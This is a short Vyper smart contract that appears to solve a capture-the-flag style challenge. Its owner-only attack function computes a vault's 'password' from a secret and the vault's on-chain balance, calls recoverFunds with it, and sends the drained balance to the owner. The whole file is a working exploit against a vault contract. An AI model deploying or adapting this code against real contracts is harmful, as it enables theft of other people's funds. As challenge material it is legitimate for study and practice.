# @version ^0.3.7

owner: immutable(address)

vault: address

@external
@payable
def __init__(_vault: address):
    assert msg.value == as_wei_value(0.0001, "ether"), "send ETH"
    owner = msg.sender
    self.vault = _vault

@external
def attack(secret: bytes32):
    assert msg.sender == owner, "!owner"
    password: uint256 = convert(
        keccak256(
            concat(
                secret,
                convert(self.vault.balance * 2, bytes32),
            )
        ),
        uint256,
    )
    raw_call(
        self.vault,
        _abi_encode(
            password,
            method_id=method_id("recoverFunds(uint256)")
        ),
        value=as_wei_value(0.0001, "ether"),
    )
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
